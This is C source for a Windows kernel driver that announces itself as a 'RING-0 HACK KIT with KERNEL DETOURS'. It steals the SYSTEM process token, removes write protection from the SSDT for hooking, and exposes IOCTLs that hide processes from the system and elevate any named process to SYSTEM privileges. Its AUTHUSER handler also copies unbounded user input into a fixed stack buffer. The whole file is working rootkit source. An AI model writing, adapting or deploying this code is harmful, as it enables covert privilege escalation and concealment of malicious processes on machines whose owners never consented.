#include "LHKdrv.h"
#pragma comment(lib, "BufferOverflowK.lib")

HLPPROCTOKEN SystemToken;

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath)
{
	UNICODE_STRING DeviceName,Win32Device;
	PDEVICE_OBJECT DeviceObject = NULL;
	NTSTATUS status;
	unsigned i;

	RtlInitUnicodeString(&DeviceName,L"\\Device\\hkComm0");
	RtlInitUnicodeString(&Win32Device,L"\\DosDevices\\hkComm0");

	for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
		DriverObject->MajorFunction[i] = LHKdrvDefaultHandler;

	DriverObject->MajorFunction[IRP_MJ_CREATE] = LHKdrvCreate;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = LHKdrvClose;
	DriverObject->MajorFunction[IRP_MJ_READ] = LHKdrvRead;
	DriverObject->MajorFunction[IRP_MJ_WRITE] = LHKdrvWrite;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = LHKdrvIoctl;

	DriverObject->DriverUnload = LHKdrvUnload;
	status = IoCreateDevice(DriverObject,
		0,
		&DeviceName,
		FILE_DEVICE_HACKKIT,
		0,
		FALSE,
		&DeviceObject);
	if (!NT_SUCCESS(status))
		return status;
	if (!DeviceObject)
		return STATUS_UNEXPECTED_IO_ERROR;

	DeviceObject->Flags |= DO_DIRECT_IO;
	DeviceObject->AlignmentRequirement = FILE_WORD_ALIGNMENT;
	status = IoCreateSymbolicLink(&Win32Device, &DeviceName);

	DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

	DbgPrint("************************************************\n");
	DbgPrint("* b0mbNET.info Research & Development **********\n");
	DbgPrint("* RING-0 HACK KIT with KERNEL DETOURS **********\n");
	DbgPrint("************************************************\n");

	//Host process name
	HlpGetProcNameOffset(); //only need to call once in DriverEntry function
	
	char procName[20]; memset(procName, 0, 20);
	HlpGetCurrProcName(procName);
	DbgPrint("Ring-0 Host Process: %s\n", procName);
	
	//Get the token for System process
	memset(&SystemToken, 0, sizeof(HLPPROCTOKEN));
	SystemToken = HlpGetCurrProcToken();
	DbgPrint("'%s' Token: 0x%x%x\n", procName, SystemToken.hi, SystemToken.lo);

	//unportect SSDT table memory
	DbgPrint("HlpUnprotectSSDT() returned: %d\n", HlpUnprotectSSDT());

	KitSetup();

	DbgPrint("************************************************\n");
	DbgPrint("* HACK KIT INITIALIZED *************************\n");
	DbgPrint("************************************************\n");

	return STATUS_SUCCESS;
}

void LHKdrvUnload(IN PDRIVER_OBJECT DriverObject)
{
	DbgPrint("************************************************\n");
	DbgPrint("* UNLOADING HACK KIT ***************************\n");
	DbgPrint("************************************************\n");\

	KitDestroy();

	DbgPrint("************************************************\n");
	DbgPrint("* GOODBYE **************************************\n");
	DbgPrint("************************************************\n");

	UNICODE_STRING Win32Device;
	RtlInitUnicodeString(&Win32Device,L"\\DosDevices\\hkComm0");
	IoDeleteSymbolicLink(&Win32Device);															 
	IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS LHKdrvDefaultHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	Irp->IoStatus.Status = STATUS_NOT_SUPPORTED;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return Irp->IoStatus.Status;
}

NTSTATUS LHKdrvCreate(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	DbgPrint("LHKdrvCreate called.\n");
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS LHKdrvClose(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	DbgPrint("LHKdrvClose called.\n");
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS LHKdrvRead(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	DbgPrint("LHKdrvRead called.\n");
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS LHKdrvWrite(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	DbgPrint("LHKdrvWrite called.\n");
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

#define CtlCode2Real(ctlCode) (2048 + ((ctlCode-0xFCCBE003)/4))
NTSTATUS LHKdrvIoctl(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	DbgPrint("LHKdrvIoctl called.\n");

	PIO_STACK_LOCATION irpStack = 0;
	irpStack = IoGetCurrentIrpStackLocation(Irp);
	ULONG ctlCode = irpStack->Parameters.DeviceIoControl.IoControlCode;
	DbgPrint("\tIOCTL func #%d\n", CtlCode2Real(ctlCode));

	ULONG outLen = irpStack->Parameters.DeviceIoControl.OutputBufferLength;
	ULONG inLen = irpStack->Parameters.DeviceIoControl.InputBufferLength;
	//METHOD_NEITHER
	PVOID outBuffer = Irp->UserBuffer;
	PVOID inBuffer = irpStack->Parameters.DeviceIoControl.Type3InputBuffer;

	PVOID tmpPVOID = 0;
	ULONG tmpULONG = 0;
	char tmpCHAR[512]; memset(tmpCHAR, 0, 512);

	switch (ctlCode)
	{
		case IOCTL_AUTHUSER:
			memset(tmpCHAR, 0, 512);
			RtlCopyMemory(tmpCHAR, inBuffer, inLen);
			tmpULONG = (ULONG)KitAuthorizeUser((PUCHAR)tmpCHAR);
			RtlCopyMemory(outBuffer, &tmpULONG, 4);
			break;
		case IOCTL_KITBRKCONT:
			if (KitApiWaitingForCont == 1)
				KitApiWaitingForCont = 0;
			break;
		case IOCTL_CURRPROCNAME:
			memset(tmpCHAR, 0, 512);
			HlpGetCurrProcName(tmpCHAR);
			if (outLen < 16) RtlCopyMemory(outBuffer, tmpCHAR, outLen);
			else RtlCopyMemory(outBuffer, tmpCHAR, 16);
			break;
		case IOCTL_HIDEPROC:
			memset(tmpCHAR, 0, 512);
			if (inLen > 16) inLen = 16;
			RtlCopyMemory(tmpCHAR, inBuffer, inLen);
			tmpULONG = (ULONG)HlpHideProcess(tmpCHAR, inLen);
			RtlCopyMemory(outBuffer, &tmpULONG, 4);
			break;
		case IOCTL_RESTOREPROC:
			if (inLen != 4) break;
			tmpULONG = 0;
			RtlCopyMemory(&tmpULONG, inBuffer, 4);
			HlpRestoreProcess((PLIST_ENTRY)tmpULONG);
			break;
		case IOCTL_ELEVATEPROC:
			memset(tmpCHAR, 0, 512);
			if (inLen > 16) inLen = 16;
			RtlCopyMemory(tmpCHAR, inBuffer, inLen);
			HlpElevateProcess(tmpCHAR, inLen, &SystemToken);
			break;
	}

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}
